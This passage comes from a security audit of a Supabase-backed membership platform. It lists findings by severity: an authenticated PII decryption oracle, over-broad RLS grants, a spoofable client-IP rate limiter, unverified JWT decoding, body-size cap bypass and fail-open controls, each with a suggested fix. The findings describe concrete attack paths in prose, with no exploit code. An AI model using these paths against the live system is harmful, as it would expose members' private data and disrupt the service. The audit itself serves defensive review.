- **What breaks:** On upsert failure the raw upsertErr.message is returned to the caller (line 120) and the outer catch returns (err as Error).message with a 500 (line 129). Postgres/PostgREST error text can disclose column names, constraint names, RLS-policy hints, and trigger internals, aiding schema mapping for further attacks. Sibling functions return generic messages via errorResponse (http.ts:77-80).
- **Smallest fix:** Return a generic error string to the client and log the detailed message server-side only.

### [Low] triage-error builds a service-role client carrying the user's JWT — latent privilege footgun  `dependency` (PLAUSIBLE)
- **Where:** supabase/functions/triage-error/index.ts:83-87
- **What breaks:** userClient = createClient(URL, SERVICE_ROLE_KEY, { global.headers.Authorization: Bearer <userJwt> }). Note: because the user JWT is in the Authorization header, PostgREST currently runs .from()/.rpc() as the authenticated user (RLS is NOT bypassed today), so the immediate getUser() use is fine. The real hazard is latent: this exact client is a full service-role (god-mode) client whose only thing keeping it in the user's RLS scope is a per-request header override. Drop or forget that override on a copy-pasted reuse and every query silently runs as service-role, bypassing RLS. Mixing the service-role apikey with a user bearer in one unlabeled object invites exactly that mistake.
- **Smallest fix:** Construct the JWT-carrying client with the ANON key (not service-role) for getUser/RLS-scoped reads, and keep the separate service-role admin client (already at line 89) strictly for privileged work, with a comment on each.

### [Low] Turnstile token is not hostname- or action-bound server-side  `security` (CONFIRMED)
- **Where:** supabase/functions/verify-turnstile/index.ts:61-97 (siteverify hostname unused; no remoteip; body.action never bound to the token)
- **What breaks:** The siteverify result's hostname is captured in the type (line 68) but never validated against PRODUCTION_HOSTS, no remoteip is sent, and action is a client claim never tied to the verified token. A token minted by the widget on any page passes verification for any of the four actions. Even after the Origin-bypass fix, cross-action token reuse remains possible within Turnstile's single-use TTL.
- **Smallest fix:** Validate result.body.hostname against PRODUCTION_HOSTS, pass the connecting IP as remoteip, and if the widget is configured with an action/cdata assert it matches body.action.

### [Low] record-web-vital swallows insert errors entirely (silent RUM data loss)  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/record-web-vital/index.ts:221
- **What breaks:** The multi-row insert is awaited but its .error is never inspected; supabase-js does not throw on a Postgres error, so schema drift, an RLS regression, or a table rename after a hand-applied migration would drop 100% of Core Web Vitals silently while the endpoint keeps returning 204. Performance observability looks healthy (beacons 'succeed') while the table quietly receives nothing.
- **Smallest fix:** Capture the insert error and emit a low-volume/sampled server-side log or metric so a total ingestion failure is detectable, while still returning 204 to the browser.

### [Low] Manifest kind labels misclassify public/unauth endpoints as cron/auth  `boundary` (CONFIRMED)
- **Where:** supabase/functions/edge-deploy-smoke/_manifest.json (rate-limit kind:cron:574, client-rate-limit-log kind:cron:77, record-web-vital kind:auth:630) vs `// @edge-cron` at rate-limit/index.ts:1 and client-rate-limit-log/index.ts:1
- **What breaks:** rate-limit and client-rate-limit-log are browser-facing, unauthenticated request endpoints yet are tagged kind:cron and carry an `// @edge-cron` header; record-web-vital is an anonymous public beacon tagged kind:auth. These labels are the human/tooling map of the attack surface — anything reasoning about 'which functions are public and need bot/rate protection' from kind will exclude the very endpoints that are most exposed, and mask that they still need the public-endpoint hardening (rate limiting, bounded bodies) they are partly missing.
- **Smallest fix:** Correct kind to reflect actual exposure (rate-limit / client-rate-limit-log / record-web-vital are public) and remove the misleading @edge-cron markers, then let smoke/monitoring tooling key protection expectations off accurate metadata.

### [Low] Per-IP edge rate limit collapses to one shared bucket when IP headers are absent  `error-handling` (PLAUSIBLE)
- **Where:** supabase/functions/_shared/edge-rate-limit.ts:17 + client-ip.ts:7-27 (used by record-web-vital:108)
- **What breaks:** added-in-verification. enforceEdgeRateLimit keys on clientIpOr(req,'unknown'); clientIp returns null when cf-connecting-ip, x-forwarded-for, and x-real-ip are all absent, so every such request shares the single literal bucket 'unknown'. Any client path that reaches the function without those headers (non-Cloudflare route, internal caller, header stripping) is throttled against one global 120/min bucket, and record-web-vital drops those beacons silently with 204 — so a header-config change silently caps or zeroes RUM ingestion for a whole class of traffic with no signal. It also lets an attacker who can suppress the IP header contend for the shared bucket to deny others.
- **Smallest fix:** When no trusted client IP is derivable, skip the per-IP cap (fail to a different, coarse global guard) rather than bucketing all header-less traffic under one 'unknown' key, and log/metric when the IP is unresolved so a header-config regression is visible.

---

## Database schema, RLS & migrations

### [High] decrypt_pii() is an authenticated-reachable PII decryption oracle with no internal authz guard  `security` (CONFIRMED)
- **Where:** supabase/migrations/20260423204012_e6fcaba2...sql:57-84 (function body, no caller check) ; 20260818120000_security_definer_grant_relock.sql:27-28 (GRANT EXECUTE ... TO authenticated)
- **What breaks:** public.decrypt_pii(cipher text) is SECURITY DEFINER, reads vault key 'pii_encryption_key', and decrypts ANY 'enc:v1:' string handed to it. Its body (lines 62-84) performs zero caller check — no has_role, no is_elevated. The last grant state (20260818120000:27-28) REVOKEs anon but GRANTs EXECUTE to `authenticated`, with only a comment promising a follow-up is_elevated() guard. I grepped all 710 migrations: that follow-up never lands. So any authenticated member can POST /rest/v1/rpc/decrypt_pii and decrypt every encrypted login IP / user-agent in the system. is_elevated() exists (same file :401) but decrypt_pii never calls it. Live confidentiality breach; the relock header also records it was briefly anon-reachable (fully unauthenticated).
- **Smallest fix:** Make the first statement of decrypt_pii(): `IF NOT public.is_elevated(auth.uid()) THEN RAISE EXCEPTION USING ERRCODE='42501'; END IF;` and REVOKE EXECUTE FROM authenticated (service_role only), so decryption only runs inside the admin-gated DEFINER views.

### [High] No migration tracking + CREATE OR REPLACE re-granting PUBLIC = silent prod drift and re-exposed internal functions  `dependency` (CONFIRMED)
- **Where:** supabase/migrations/20260826140000_environment_readiness_critical_objects.sql:3-9 (verbatim: no supabase_migrations.schema_migrations table; Discord PGRST202 outage) ; 20260818120000_security_definer_grant_relock.sql:1-6 (documents CREATE OR REPLACE silently reset grants, re-exposed decrypt_pii to anon)
- **What breaks:** 20260826140000:3-9 states in prod-verified prose there is NO schema_migrations table and migrations are hand-applied via the SQL editor, so a deployed edge function can call an object never applied to prod — already the cause of the Discord-linking outage (create_discord_oauth_state missing → PGRST202). Compounding it: Postgres grants EXECUTE to PUBLIC on every CREATE (OR REPLACE) FUNCTION, and this repo removes that only via scattered manual REVOKEs; any later redefinition (e.g. to add SET search_path) silently re-opens the function. 20260818120000:1-6 documents this exact regression re-exposing decrypt_pii as an unauthenticated oracle. With 710 hand-run files and last-write-wins CREATE OR REPLACE, both object presence and grant posture are unverifiable and drift continuously.
- **Smallest fix:** Adopt a tracked runner (supabase db push with schema_migrations) so git == prod and order is enforced; replace post-hoc REVOKEs with `ALTER DEFAULT PRIVILEGES ... REVOKE EXECUTE ON FUNCTIONS FROM PUBLIC` + explicit per-function GRANTs, so a redefinition cannot silently re-expose.

### [High] profiles RLS grants column-wide UPDATE to authenticated, bypassing ProfileService allow-list/sanitization  `boundary` (CONFIRMED)
- **Where:** supabase/migrations/20260315192853_fb0c112e...sql:61-63 (UPDATE policy USING auth.uid()=user_id, no WITH CHECK, no column scope). Column guards exist ONLY for membership_* (20260803120000_membership_ledger_projection.sql:126-179), email (20260412205504:17-36), and discord_username/discord_user_id (20260428050200:1-18). No column-level REVOKE/GRANT on profiles exists anywhere.
- **What breaks:** The intended architecture routes all profiles writes through ProfileService for XSS sanitization + mass-assignment allow-listing. RLS enforces only the ROW (auth.uid()=user_id) and authenticated keeps the default column-wide UPDATE grant. Only membership_*, email, and discord_* are trigger-guarded. So a member can PATCH /rest/v1/profiles?user_id=eq.<self> and directly set every other column with no sanitization and no allow-list: bio, professional_background, interests, avatar_url (stored XSS lands unsanitized because ProfileService is skipped), and is_test_account / profile_completed / onboarded_at (evade analytics/onboarding gating — both are real profiles columns, read back in admin_list_users). NOTE: the first pass's discord_user_id harm example is FALSE — 20260428050200 silently reverts non-service_role discord_user_id/discord_username changes, so that specific Discord-account-hijack path is blocked. The column-wide-write defect itself stands at full severity for all other columns.
- **Smallest fix:** `REVOKE UPDATE ON public.profiles FROM authenticated; GRANT UPDATE (display_name,bio,...safe cols...) ON public.profiles TO authenticated`, or route all writes through a SECURITY DEFINER update_profile RPC and revoke direct UPDATE.

### [High] run_auto_remediations() is SECURITY DEFINER, granted to authenticated, with NO internal admin gate — any member can trigger privileged auto-remediation execution  `security` (CONFIRMED)
- **Where:** supabase/migrations/20260418201529_7bf95eaf...sql:241-329 (function body has no has_role check; GRANT EXECUTE ... TO authenticated at :329). Re-granted to authenticated again at 20260428032029:104, 20260501160148:12, 20260513021059:2.
- **What breaks:** Unlike its siblings (pause_email_lane:287, get_email_outbox:333, set_fix_queue_status:175 all start with `IF NOT has_role(auth.uid(),'admin') THEN RAISE`), run_auto_remediations() has NO caller check — its body goes straight into the remediation loop and runs `EXECUTE format('SELECT public.%I()', rule.remediation_function)` as owner (postgres) for every enabled rule. It is granted to `authenticated`, so any of ~767 members can POST /rest/v1/rpc/run_auto_remediations and force execution of privileged maintenance functions on demand (bypassing cooldowns, spamming audit_log, driving side effects of every allow-listed remediation). The 20260501160148 migration's own comment falsely asserts 'All of these functions self-check has_role(auth.uid(),"admin") internally, so granting EXECUTE to authenticated is safe' — that assertion does not hold for this function, and 20260818120000 itself lists run_auto_remediations as needing an is_elevated() guard that was never added.
- **Smallest fix:** Add `IF NOT public.has_role(auth.uid(),'admin') THEN RAISE EXCEPTION USING ERRCODE='42501'; END IF;` as the first statement, or REVOKE EXECUTE FROM authenticated and let only pg_cron/service_role invoke it. Then fix the false 'all self-check' comment.
- _added-in-verification_

### [Medium] chunk_stale_log allows unbounded unauthenticated INSERT of attacker-controlled text  `security` (CONFIRMED)
- **Where:** supabase/migrations/20260530194518_502f993d-3de8-4c17-b22d-fe9068e4dc44.sql:9-14 (GRANT INSERT TO anon,authenticated; GRANT USAGE,SELECT ON SEQUENCE TO anon; POLICY FOR INSERT TO anon,authenticated WITH CHECK (true))
- **What breaks:** chunk_stale_log grants INSERT + sequence USAGE to anon and has an INSERT policy WITH CHECK (true). url/user_agent/build_id_* are unbounded TEXT with no length cap, no rate limit, no auth. An unauthenticated attacker can POST unlimited rows to /rest/v1/chunk_stale_log — storage exhaustion and poisoning of the admin System Health dashboards that read this table. The occurred_at index only helps reads, not write abuse. Cheap availability/log-poisoning vector on a shared Postgres.
- **Smallest fix:** Route chunk-stale telemetry through a rate-limited SECURITY DEFINER RPC (reuse the existing check_rate_limit machinery), add CHECK length limits on the text columns, and drop the direct anon INSERT + sequence grants.

### [Medium] admin_list_users returns the full profiles row minus a single deny-listed column (blocklist, not allowlist)  `security` (CONFIRMED)
- **Where:** supabase/migrations/20260729210000_admin_list_users_rpc.sql:79 ((to_jsonb(p) - 'guardian_consent_token'))
- **What breaks:** The admin roster serializes the ENTIRE profiles row to jsonb and strips exactly one column by name. This is a deny-list: any sensitive column added to profiles in a future migration (another token, an encrypted PII field, an internal flag) is automatically included in the payload with no code change flagging it. profiles already accumulates PII/CONFIDENTIAL columns (discord_user_id is classified CONFIDENTIAL at 20260322030549:114) and secrets have historically lived there (guardian_consent_token). The next such column silently leaks into this API surface. Deny-lists rot; the one-line strip will not keep pace with schema growth.
- **Smallest fix:** Return an explicit allow-list of named profile columns (build the jsonb from named fields) instead of to_jsonb(p) minus one, so new columns are excluded by default.

### [Medium] profiles.email is an un-reconciled mirror of auth.users.email; client changes are silently reverted, not rejected  `ownership` (CONFIRMED)
- **Where:** supabase/migrations/20260316021654_a263b077...sql (handle_new_user copies auth email into profiles at signup) ; 20260412205504_37734a4d...sql:26-28 (prevent_email_change: NEW.email := OLD.email, no RAISE). Grep confirms only AFTER INSERT / BEFORE DELETE triggers on auth.users — no AFTER UPDATE OF email re-sync trigger exists.
- **What breaks:** auth.users.email is the true owner; profiles.email is a copy written only at signup. prevent_email_change blocks member edits, but nothing re-syncs profiles.email when the user changes their real email via GoTrue — the two silently diverge (verified: no AFTER UPDATE trigger on auth.users anywhere). Multiple flows key on profiles.email: membership pending-sale resolution and marketing/roster lookups match lower(email). After a real email change, a paid member's Gumroad sale (recorded under the new email) will not resolve to their profile, and roster/marketing show the stale address. prevent_email_change also reverts client attempts with NO error (NEW.email:=OLD.email, no RAISE), so a 'save email' path reports success while the value silently stays old — a confusing partial-failure.
- **Smallest fix:** Make auth.users.email the single source: either drop profiles.email and read auth email via a DEFINER function, or add an AFTER UPDATE OF email trigger on auth.users that re-syncs profiles.email; and have prevent_email_change RAISE instead of silently reverting.

### [Medium] email queue pgmq wrapper functions are SECURITY DEFINER with no SET search_path  `security` (CONFIRMED)
- **Where:** supabase/migrations/20260316051305_email_infra.sql:129-156 (enqueue_email, read_email_batch, delete_email, move_to_dlq — all SECURITY DEFINER, none set search_path)
- **What breaks:** These run as owner (postgres) and wrap pgmq, but set no search_path, so object resolution depends on the session search_path — exactly the Supabase advisor 0011 class the rest of the codebase later scrambled to fix. Their only protection is a manual REVOKE at :160-170, which (per the CREATE OR REPLACE / PUBLIC-regrant finding) any later redefinition silently undoes — and queue wrappers are precisely the functions repeatedly redefined. A momentary re-grant turns owner-privileged queue manipulation (enqueue arbitrary email, delete/replay DLQ) into an authenticated-reachable operation, and the missing search_path adds a resolution-hijack surface.
- **Smallest fix:** Add `SET search_path = ''` and fully-qualify all pgmq/public names in these four functions; move their grant control to ALTER DEFAULT PRIVILEGES so a redefinition cannot reopen them.

### [Medium] audit_log.changed_fields stores raw PII values despite an explicit 'no values stored' schema contract  `error-handling` (CONFIRMED)
- **Where:** supabase/migrations/20260315195132_2d9d0ae9...sql:10 (column comment: 'Which columns changed (no values stored)') vs 20260317215108_88294213...sql:136,140 (ARRAY[NEW.email]) and :85 (ARRAY[OLD.status,NEW.status]), :111,115 (ARRAY[NEW.title]) ; announcements 20260317221751:55 (ARRAY[NEW.title])
- **What breaks:** changed_fields is documented and classified as metadata (column names only, 'no values stored', 7-year retention). But audit triggers stuff actual values into it: invitee EMAIL addresses (audit_invitation ARRAY[NEW.email], both INSERT and UPDATE paths), announcement/conversation TITLES, and application status transitions. The PII-encryption trigger on audit_log encrypts only ip_address, not changed_fields, so these emails sit in cleartext for 7 years in a table whose data-classification contract says it holds no values — a concrete compliance/retention violation that also widens the blast radius of every audit_log read.
- **Smallest fix:** Store only column names in changed_fields (ARRAY['email'] not ARRAY[NEW.email]); if a value is genuinely needed, put it in a separately-classified, encrypted column.

### [Medium] tg_hash_chain reads the previous audit hash with no lock — concurrent inserts fork the tamper-evidence chain  `error-handling` (PLAUSIBLE)
- **Where:** supabase/migrations/20260423204012_e6fcaba2...sql:267-291 (tg_hash_chain: SELECT row_hash ... ORDER BY created_at DESC, id DESC LIMIT 1; BEFORE INSERT trigger on audit_log and admin_promotions)
- **What breaks:** The append-only hash chain reads the latest row_hash in a BEFORE INSERT trigger with a plain SELECT and no advisory lock or serialization. audit_log is written on many hot paths (login, task completion, status changes, auto-remediation). Two concurrent inserts both read the same latest hash and both set prev_hash to it, forking the chain. verify_audit_chain() (:318) walks strictly ordered and expects each row's prev to equal the immediately preceding row_hash, so a legitimate concurrent fork makes it report the chain BROKEN — a false tamper alarm — or, worse, masks a real deletion between forked branches. The integrity control degrades to noise under normal concurrency.
- **Smallest fix:** Serialize chain appends: take a transaction-level advisory lock (pg_advisory_xact_lock on a per-table key) at the top of tg_hash_chain, or move hashing to a single-writer queue drain, so prev_hash is always the committed tip.
- _added-in-verification_

### [Medium] encrypt_pii fails OPEN — silently stores cleartext PII when the vault key is missing  `error-handling` (CONFIRMED)
- **Where:** supabase/migrations/20260423204012_e6fcaba2...sql:44-52 (encrypt_pii: if v_key IS NULL, `RETURN plain;`) used by tg_encrypt_pii_columns and the backfill UPDATEs at :144-161
- **What breaks:** encrypt_pii returns the raw plaintext (not an error, not a sentinel) whenever the vault key can't be read — commented 'Fail open ... so we never lose data'. The auto-encrypt triggers and the one-time backfill call it for failed_login_attempts, passkey_login_sessions, passkey_recovery_tokens, audit_log and security_events IPs/user-agents. If the vault secret is absent/misconfigured at write time (e.g. mid-migration, restored env, rotated-away key), every IP and user-agent is written in cleartext while the system looks healthy, and the 'enc:v1:' prefix check means those rows are then treated as pre-encryption plaintext forever (never re-encrypted). decrypt_pii meanwhile fails closed ('[encrypted]'), so the inconsistency is invisible until an audit. That is a silent PII-at-rest exposure hiding a failure instead of reporting it.
- **Smallest fix:** Fail closed: if the vault key is NULL, RAISE (or write a NULL/sentinel that a monitored job retries) instead of returning plaintext; add a check that alerts on any target-column value not matching 'enc:v1:%'.
- _added-in-verification_

### [Medium] membership_tier enum swap does a full ACCESS EXCLUSIVE table rewrite of profiles, hand-applied on prod with no transaction/maintenance guard  `other` (PLAUSIBLE)
- **Where:** supabase/migrations/20260424133609_b99b5533...sql:4-25 (ALTER TYPE ... RENAME; CREATE TYPE; ALTER COLUMN membership_tier DROP DEFAULT at :10; ALTER COLUMN ... TYPE ... USING CASE at :12-20; SET DEFAULT at :22-23; DROP TYPE at :25)
- **What breaks:** This renames the old enum, creates a new one, then ALTER COLUMN membership_tier TYPE — a full rewrite of profiles taking ACCESS EXCLUSIVE — then re-adds the default and drops the old type. There is no explicit BEGIN/COMMIT wrapper. Applied by hand (no migration runner, per the tracking finding) against the live 767-user central table, it blocks ALL profile reads/writes for the rewrite duration. If the session drops between the DROP DEFAULT (:10) and SET DEFAULT (:22) steps, or the type swap is interrupted, profiles is left half-migrated with the default missing and no automatic rollback. NOTE: the first pass's 'unmapped value throws' claim is FALSE — the USING has ELSE 'starter' (:18) so unmapped tiers don't error; instead they are silently coerced to starter, its own quiet data-integrity loss. The self-inflicted-outage / partial-failure risk on the platform's central table stands.
- **Smallest fix:** Widen enums with expand/contract: ALTER TYPE ... ADD VALUE (non-rewriting), backfill, and do any swap inside one explicit transaction during a maintenance window via a tracked runner — never rename+rewrite+drop hand-run against prod.
- _first-pass category 'over-engineering' corrected to migration-safety; unmapped-value claim corrected_

### [Low] Grant posture is emergent across dozens of ad-hoc REVOKE/GRANT migrations with no owning source of truth  `dependency` (CONFIRMED)
- **Where:** supabase/migrations/20260428032029...sql (bulk REVOKE of many functions) ; 20260501160148_c4f6b0e2...sql:1-20 (re-GRANT after over-revoke broke dashboard RPCs) ; 20260512/20260513/20260818 relocks ; function_grant_audit table at 20260530194518:20-51 is a snapshot only, not enforced
- **What breaks:** Function EXECUTE privileges are managed by a long series of reactive REVOKE-everything-then-re-GRANT-some migrations. 20260501160148:1-5 documents the consequence: a prior blanket REVOKE stripped authenticated EXECUTE from admin-gated dashboard RPCs, so every call returned permission_denied and React Query retried 3x → a visible refetch storm ('loop and glitch when saving as a draft'). Because no single place declares the intended grant matrix, each redefinition risks re-breaking prod in one direction (permission_denied outage) or the other (re-exposure). function_grant_audit exists but only snapshots current grants; nothing asserts them in CI. Unmaintainable at 710 files; recurrence is guaranteed.
- **Smallest fix:** Define the intended per-role EXECUTE matrix once (a generated, tested manifest, or use function_grant_audit as a CI assertion that fails the build on drift) and enforce it, instead of hand-patching grants per incident.

---

## Edge shared utilities & Supabase config/tests

### [High] Audit pipeline throttles security events during an attack (comment says it doesn't)  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/audit.ts:83-103,113-115
- **What breaks:** shouldEmit() applies a per-event cap (DEFAULT_CAP 30/min x pressureMul() = down to ~3/min under 'hard' pressure, line 85) and a 30s dedup window to EVERY event passed to auditEdgeEvent, including authn_unauthorized / authz_admin_denied / authz_check_failed. The comment at line 113 says 'skip for known-low-volume security events' but no allowlist or severity gate exists — the very next line unconditionally runs shouldEmit and returns. Worse, the dedup fingerprint (line 114) is `event::fn::(errorMessage||recordId||'')` and does NOT include IP or userId, so a credential-stuffing flood from many IPs collapses to ONE audit row per 30s per event/fn. During the attack the DB is under load, system_health_state flips audit_pressure to hard, the cap drops to ~3/min, and the forensic trail of the incident is silently reduced to a trickle exactly when you need it.
- **Smallest fix:** Allowlist security-critical event types (authn_*/authz_*) to bypass shouldEmit entirely, or gate only info-severity through the cap; and include IP/userId in the dedup fingerprint so distinct attackers are not merged.

### [High] WAF body-size cap trusts Content-Length — the exact DoS bounded-body.ts exists to stop  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/waf.ts:124-132
- **What breaks:** applyWaf reads `parseInt(req.headers.get('content-length') ?? '0')` (line 128) and only denies when that DECLARED value exceeds the cap. Omit Content-Length (or understate it) and len=0, the check passes, and the handler can then stream an arbitrarily large body — memory-exhaustion DoS on every function fronted by the WAF. The sibling bounded-body.ts / http.ts parseJsonBody (line 50-54) were written precisely because 'Content-Length ... a caller can omit/understate to buffer an arbitrarily large body', yet the WAF still trusts it while advertising 'Oversized request bodies (>1 MB)' protection in its header comment (line 8).
- **Smallest fix:** WAF must stop advertising a body-size guarantee; make handlers read bodies via readBoundedText/parseJsonBody which enforce the cap while streaming. Treat the Content-Length check as an optimization only, never enforcement.

### [High] Client IP resolution falls back to attacker-controlled headers when cf-connecting-ip is absent  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/client-ip.ts:7-22
- **What breaks:** When cf-connecting-ip is missing, clientIp() returns the LAST X-Forwarded-For hop (line 17) then X-Real-IP (line 20-21). Supabase edge functions are directly reachable at *.functions.supabase.co without traversing Cloudflare; a direct caller controls the ENTIRE XFF header, so the 'last hop' is simply whatever the attacker appended, and X-Real-IP is fully client-set. This value keys enforceEdgeRateLimit, the WAF per-IP burst bucket, and is written as ip_address into security_events/audit rows. An attacker rotates the header for unlimited fresh rate-limit buckets and to poison the audit trail with forged source IPs. The 'last hop not leftmost' trick only helps when a trusted proxy actually appends the hop — which does not hold on a directly-reachable endpoint.
- **Smallest fix:** Only trust cf-connecting-ip; reject or hard-limit requests that arrive without it (i.e. bypassing Cloudflare). Never derive a rate-limit/audit identity from XFF or X-Real-IP on a directly-reachable endpoint.

### [High] Edge rate limiter fails OPEN on any error — evaporates during the load it exists to cap  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/edge-rate-limit.ts:29,31-33
- **What breaks:** Both the RPC-error branch (line 29) and the catch (line 31) return {allowed:true}. The limiter calls check_edge_rate_limit against Postgres; under a volumetric attack the DB is the first thing to slow/error, so the limiter returns 'allowed' for everything exactly when the flood is happening — it becomes a no-op under pressure. 'availability > strictness' (comment line 4) is the wrong default for a control whose entire job is to shed abusive load. Combined with the spoofable client IP above, per-identity limits are doubly defeated.
- **Smallest fix:** Fail closed (or degrade to a conservative in-memory token bucket) for unauthenticated/public actions when the limiter backend errors; reserve fail-open for authenticated low-risk paths only.

### [Medium] Freescout circuit breaker gets stuck permanently half-open after a failed probe  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescout.ts:61-74
- **What breaks:** When cooldown elapses, breakerOpen() sets failures=THRESHOLD-1 (line 64) and admits one probe. If that probe fails, recordFailure() bumps failures back to THRESHOLD but only sets openedAt when openedAt===0 (line 71) — it is already non-zero, so openedAt is never refreshed. Thereafter Date.now()-openedAt is always > BREAKER_COOLDOWN_MS, so breakerOpen() always takes the 'cooldown expired' branch and admits a request on EVERY call while Freescout is still down. The thundering-herd protection silently disappears after the first cooldown during a sustained outage.
- **Smallest fix:** In recordFailure(), refresh openedAt=Date.now() whenever failures>=THRESHOLD (not only when openedAt===0), so a failed half-open probe re-arms the cooldown.

### [Medium] Three-to-four divergent CORS header definitions across the shared library  `ownership` (CONFIRMED)
- **Where:** supabase/functions/_shared/http.ts:8-14; waf.ts:87-91; compliance.ts:2-6
- **What breaks:** corsHeaders is defined independently in http.ts (Allow-Headers includes x-trace-id/x-request-id, adds Vary:Origin + nosniff on jsonHeaders), waf.ts (Allow-Origin:* with x-supabase-client-* headers, NO trace/request headers), and compliance.ts (a third copy byte-identical to waf's). A WAF deny (403/429) or a compliance response returns a CORS set that OMITS the x-trace-id/x-request-id the frontend wrappers send — so the browser can reject the preflight/error and the client sees an opaque network error instead of the real 429/403, the same 'invoke_error with zero edge logs' class the http.ts comment (line 4-7) describes. No single owner of 'what CORS looks like.'
- **Smallest fix:** Export one corsHeaders/handleCors from http.ts and import it in waf.ts and compliance.ts; delete the copies.

### [Medium] functions.manifest.json 'kind' misclassifies public and client-invoked functions as cron/auth  `ownership` (CONFIRMED)
- **Where:** supabase/functions.manifest.json:537-553 (public-*), 341-343/453-455/460-462 (role mutators), 327-336 (get-*)
- **What breaks:** The manifest is a second source of truth alongside config.toml and its 'kind' has drifted: internet-facing public read endpoints public-classes, public-project-detail, public-project-openings are all kind:'cron'; client-invoked mutators manage-discord-roles, grant-observer-role, mark-interview-scheduled are kind:'cron'; public routes get-discord-member-count and get-i18n-bundle are kind:'auth'. Any deploy/monitoring/soak tooling that keys off 'kind' (synthetic auth probes, WAF coverage, service-role-only network policy) will treat public internet endpoints as internal cron workers and vice-versa — a security-relevant misclassification that keeps drifting because verify_jwt is duplicated across both files. (Correction to first pass: promote-to-teacher is actually kind:'public' at line 530-532, not cron; the other seven are confirmed mislabeled.)
- **Smallest fix:** Generate the manifest FROM config.toml plus a single classification source, and add a CI check that fails if a function's kind/verify_jwt disagree between the two files.

### [Medium] Allowed-origin / production-host facts are copied into 3+ hand-synced lists  `ownership` (CONFIRMED)
- **Where:** supabase/functions/_shared/auth-hosts.ts:3-9; discord-oauth.ts:18-23; confirm-role.ts:48-51 (allowedOrigins injected by callers)
- **What breaks:** auth-hosts.ts PRODUCTION_HOSTS ({techfleetnetwork.lovable.app, www.techfleet.network, techfleet.network}) is explicitly 'Mirror of src/lib/auth/production-hosts.ts. Keep in sync'. discord-oauth.ts ALLOWED_LINK_ORIGINS is a third independent allowlist ({https://techfleet.network, www, localhost:8080, 127.0.0.1:8080}) — already divergent (it lacks the lovable.app host; auth-hosts lacks localhost). confirm-role.evaluateConfirmation consumes yet another origin Set passed in by each confirm-* function. Add a new production domain (or change the lovable preview host) and miss one copy: edge-side origin validation diverges from the frontend — legit users get 403 forbidden_origin on confirm-admin/teacher-role and Discord linking, or a stale origin stays silently trusted. This 'kept in sync' pattern has already caused outages in this repo.
- **Smallest fix:** One exported allowed-origins/PRODUCTION_HOSTS constant (or generated) consumed by edge and frontend, not hand-mirrored copies.

### [Medium] supabase-js pinned at three different versions across the shared library  `dependency` (CONFIRMED)
- **Where:** supabase/functions/_shared/http.ts:1 (npm 2.99.1/cors); admin-client.ts:31 & audit.ts:14 & admin-step-up.ts:1 (npm @2 floating); idempotency.ts:26 (esm.sh 2.45.4)
- **What breaks:** http.ts imports the CORS helper from npm:@supabase/supabase-js@2.99.1, admin-client/audit/admin-step-up import npm:@supabase/supabase-js@2 (floating latest), and idempotency.ts imports types from https://esm.sh/@supabase/supabase-js@2.45.4. Three resolved versions bundle into the same isolates, inflating cold-start/bundle size, and — more dangerously — the auth/JWT/getClaims behavior request-auth.ts depends on can differ between a floating @2 and a pinned 2.45.4/2.99.1. A minor bump in the floating import can change token-verification semantics fleet-wide with no code change.
- **Smallest fix:** Pin one exact version in a shared import map / deno.json and import supabase-js from it everywhere.

### [Medium] Idempotency replay hardcodes HTTP 200 and discards all original headers  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/idempotency.ts:115-125
- **What breaks:** On a cache hit the replay builds `new Response(body, { status: 200, headers: { Content-Type, X-Idempotent-Replay } })`. If the first call returned 201 Created, 202 Accepted, or a 2xx with Location / Set-Cookie / rate-limit headers, the idempotent retry silently returns 200 with none of them. A client that branches on status or reads Location behaves differently on the retry than on the first call — defeating the point of idempotency (identical outcome) and potentially corrupting client-side flow control.
- **Smallest fix:** Persist and restore the original status code and a safe allowlist of headers in complete_idempotency, or only cache/replay handlers known to return a plain 200 JSON body.

### [Medium] Unverified JWT decoding used for identity in idempotency and admin step-up  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/idempotency.ts:48-60,85-97; admin-step-up.ts:25-32
- **What breaks:** readUserIdFromJwt() and requireFreshAdmin2fa() base64-decode the JWT payload with atob() and trust sub/aal WITHOUT verifying the signature (contrast request-auth.ts which uses auth.getClaims). idempotency namespaces its storage key and request-hash by this unverified sub. For any function with verify_jwt=false wrapping a path in withIdempotency, an attacker can forge a token carrying a victim's sub to pre-seed or probe the victim's idempotency key-space (poisoning requires a matching key+body, but that is one crafted request away). The step-up aal check is backed by a real DB lookup so it is only defense-in-depth there — but the trust-unverified-claims pattern is repeated and one call site away from exploitable.
- **Smallest fix:** Derive userId only from a verified token (getClaims), or pass in the already-verified userId; never parse identity from an unverified JWT payload.

### [Medium] idempotency anon scope collapses all unauthenticated callers into one shared key-space  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/idempotency.ts:76,85-97
- **What breaks:** When readUserIdFromJwt returns null (any verify_jwt=false / public path), scope falls back to the literal string 'anon' (line 85). storageKey becomes sha256('anon:'+key) and requestHash sha256(method:path:'anon':body) — identical for EVERY anonymous caller. Two different anonymous users that send the same client-generated X-Request-Id (a fixed/common value, a low-entropy client default, or a collision) with the same body will share one cache row: the second caller replays the first caller's private response. On a public endpoint this is a cross-user data leak with no forged token required.
- **Smallest fix:** Never cache for anonymous callers (skip idempotency when userId is null), or fold a per-caller entropy source (verified IP/nonce) into the anon scope; do not use a constant 'anon' namespace.
- _added-in-verification_

### [Medium] freescoutCache userTagIndex leaks memory and misses untagged entries after mutations  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescoutCache.ts:12-20,41-43,46-62
- **What breaks:** touch()/getCached evict or expire entries from `store` but NEVER remove the corresponding key from userTagIndex (lines 15-19, 31-34), so userTagIndex accumulates keys for dead entries forever — unbounded growth per long-lived isolate, contradicting the 256MB-cap claim in the file header. Separately, setCached does NOT call tagForUser (line 41-43); tagging is a separate manual call the caller must remember, and invalidateUser only deletes tagged keys (line 50-53). Any entry cached without a matching tagForUser survives invalidateUser after a mutation, so a Freescout ticket mutation can leave the same user reading stale cached data for the full TTL.
- **Smallest fix:** Fold tagging into setCached (tag on write) and prune userTagIndex on every eviction/expiry; or key the cache by a plaintext-prefixed structure that supports per-user deletion directly.

